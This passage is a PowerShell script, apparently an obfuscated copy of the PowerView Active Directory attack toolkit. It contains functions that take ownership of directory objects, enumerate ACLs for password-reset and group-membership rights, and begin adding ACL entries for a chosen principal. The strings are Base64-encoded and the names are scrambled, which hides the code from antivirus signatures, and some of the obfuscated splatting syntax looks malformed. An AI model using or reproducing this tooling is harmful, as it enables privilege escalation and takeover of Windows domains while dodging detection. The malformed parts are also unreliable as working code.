            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${__/==\/\___/==\_/}, $AuditFlag, $ObjectType, $InheritanceType, $InheritedObjectType
            }
        }
        else {
            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${__/==\/\___/==\_/}, $AccessControlType
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${__/==\/\___/==\_/}, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${__/==\/\___/==\_/}, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${__/==\/\___/==\_/}, $AccessControlType, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${__/==\/\___/==\_/}, $AccessControlType, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${__/==\/\___/==\_/}, $AccessControlType, $ObjectType, $InheritanceType, $InheritedObjectType
            }
        }
    }
}
function Set-DomainObjectOwner {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $OwnerIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/=\_/======\___/} = ___/\___/\__/===\/ @/=\___/=\__/=\/\/ -Identity $OwnerIdentity -Properties objectsid | select -ExpandProperty objectsid
        if (${_/=\_/======\___/}) {
            ${/=\/\/=\_/\/=\/==} = [System.Security.Principal.SecurityIdentifier]${_/=\_/======\___/}
        }
        else {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AE8AdwBuAGUAcgBdACAARQByAHIAbwByACAAcABhAHIAcwBpAG4AZwAgAG8AdwBuAGUAcgAgAGkAZABlAG4AdABpAHQAeQAgACcAJABPAHcAbgBlAHIASQBkAGUAbgB0AGkAdAB5ACcA')))
        }
    }
    PROCESS {
        if (${/=\/\/=\_/\/=\/==}) {
            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity
            ${___/==\_/\_/=\___} = ___/\___/\__/===\/ @/=\___/=\__/=\/\/
            ForEach ($Object in ${___/==\_/\_/=\___}) {
                try {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AE8AdwBuAGUAcgBdACAAQQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAHMAZQB0ACAAdABoAGUAIABvAHcAbgBlAHIAIABmAG8AcgAgACcAJABJAGQAZQBuAHQAaQB0AHkAJwAgAHQAbwAgACcAJABPAHcAbgBlAHIASQBkAGUAbgB0AGkAdAB5ACcA')))
                    ${__/======\_/\/=\/} = ${___/==\_/\_/=\___}.GetDirectoryEntry()
                    ${__/======\_/\/=\/}.PsBase.Options.SecurityMasks = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA==')))
                    ${__/======\_/\/=\/}.PsBase.ObjectSecurity.SetOwner(${/=\/\/=\_/\/=\/==})
                    ${__/======\_/\/=\/}.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AE8AdwBuAGUAcgBdACAARQByAHIAbwByACAAcwBlAHQAdABpAG4AZwAgAG8AdwBuAGUAcgA6ACAAJABfAA==')))
                }
            }
        }
    }
}
function _____/=\/\/\/\/\/= {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [Switch]
        ${__/=\_/=\/=\/\/==\},
        [Switch]
        $ResolveGUIDs,
        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbgB0AHMAZQBjAHUAcgBpAHQAeQBkAGUAcwBjAHIAaQBwAHQAbwByACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA=')))]) {
            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA=')))
        }
        else {
            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA=')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${__/=\_/=\/\__/\/\} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
        ${__/=\/=\_/\/\_/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${__/=\/=\_/\/\_/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${__/=\/=\_/\/\_/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${__/=\/=\_/\/\_/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${__/=\/=\_/\/\_/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${__/=\/=\_/\/\_/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))]) {
            ${_/=\_/=\__/\_/\/=} = _/==\/\/\/\/\/===\ @__/=\/=\_/\/\_/\/
        }
    }
    PROCESS {
        if (${__/=\_/=\/\__/\/\}) {
            ${_____/\_/\/=\/=\_} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${___/=\_/\/\__/===} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${___/=\_/\/\__/===} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewBfAF8AXwAvAD0AXABfAC8AXAAvAFwAXwBfAC8APQA9AD0AfQApAA==')))
                }
                elseif (${___/=\_/\/\__/===} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAEMATgB8AE8AVQB8AEQAQwApAD0ALgAqAA==')))) {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${/====\/==\_/=====} = ${___/=\_/\/\__/===}.SubString(${___/=\_/\/\__/===}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsALwA9AD0APQA9AFwALwA9AD0AXABfAC8APQA9AD0APQA9AH0AJwAgAGYAcgBvAG0AIAAnACQAewBfAF8AXwAvAD0AXABfAC8AXAAvAFwAXwBfAC8APQA9AD0AfQAnAA==')))
                        ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${/====\/==\_/=====}
                        ${__/=\_/=\/\__/\/\} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
                        if (-not ${__/=\_/=\/\__/\/\}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAGgAZQByACAAZgBvAHIAIAAnACQAewAvAD0APQA9AD0AXAAvAD0APQBcAF8ALwA9AD0APQA9AD0AfQAnAA==')))
                        }
                    }
                }
                elseif (${___/=\_/\/\__/===} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    ${_/==\/\_/==\_/\/=} = (([Guid]${___/=\_/\/\__/===}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AD0AXAAvAFwAXwAvAD0APQBcAF8ALwBcAC8APQB9ACkA')))
                }
                elseif (${___/=\_/\/\__/===}.Contains('.')) {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACkAKABuAGEAbQBlAD0AJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACkAKABkAG4AcwBoAG8AcwB0AG4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AKQApAA==')))
                }
                else {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACkAKABuAGEAbQBlAD0AJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACkAKABkAGkAcwBwAGwAYQB5AG4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AKQApAA==')))
                }
            }
            if (${_____/\_/\/=\/=\_} -and (${_____/\_/\/=\/=\_}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8AXwBfAF8ALwBcAF8ALwBcAC8APQBcAC8APQBcAF8AfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABVAHMAaQBuAGcAIABhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAEwARABBAFAARgBpAGwAdABlAHIA')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            if ($Filter) {
                ${__/=\_/=\/\__/\/\}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACQARgBpAGwAdABlAHIAKQA=')))
            }
            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $(${__/=\_/=\/\__/\/\}.filter)"
            ${/==\_/=\____/===\} = ${__/=\_/=\/\__/\/\}.FindAll()
            ${/==\_/=\____/===\} | ? {$_} | % {
                $Object = $_.Properties
                if ($Object.objectsid -and $Object.objectsid[0]) {
                    ${__/\_/=\__/=\__/\} = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    ${__/\_/=\__/=\__/\} = $Null
                }
                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB0AHMAZQBjAHUAcgBpAHQAeQBkAGUAcwBjAHIAaQBwAHQAbwByAA==')))][0], 0 | % { if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA=')))]) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | % {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))]) {
                            ${/==\/=\__/\/===\/} = Switch ($RightsFilter) {
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                                Default { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADAAMAAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAAwADAA'))) }
                            }
                            if ($_.ObjectType -eq ${/==\/=\__/\/===\/}) {
                                $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) ${__/\_/=\__/=\__/\}
                                ${__/=\/\__/\/=\___} = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) ${__/\_/=\__/=\__/\}
                            ${__/=\/\__/\/=\___} = $True
                        }
                        if (${__/=\/\__/\/=\___}) {
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if (${_/=\_/=\__/\_/\/=}) {
                                ${_/\_/\_/\_/\__/==} = @{}
                                $_.psobject.properties | % {
                                    if ($_.Name -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAVAB5AHAAZQB8AEkAbgBoAGUAcgBpAHQAZQBkAE8AYgBqAGUAYwB0AFQAeQBwAGUAfABPAGIAagBlAGMAdABBAGMAZQBUAHkAcABlAHwASQBuAGgAZQByAGkAdABlAGQATwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA=')))) {
                                        try {
                                            ${_/\_/\_/\_/\__/==}[$_.Name] = ${_/=\_/=\__/\_/\/=}[$_.Value.toString()]
                                        }
                                        catch {
                                            ${_/\_/\_/\_/\__/==}[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        ${_/\_/\_/\_/\__/==}[$_.Name] = $_.Value
                                    }
                                }
                                ${/\____/===\___/==} = New-Object -TypeName PSObject -Property ${_/\_/\_/\_/\__/==}
                                ${/\____/===\___/==}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEMATAA='))))
                                ${/\____/===\___/==}
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEMATAA='))))
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
                }
            }
        }
    }
}
function Add-DomainObjectAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${___/\/=\_/=\__/\/},
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
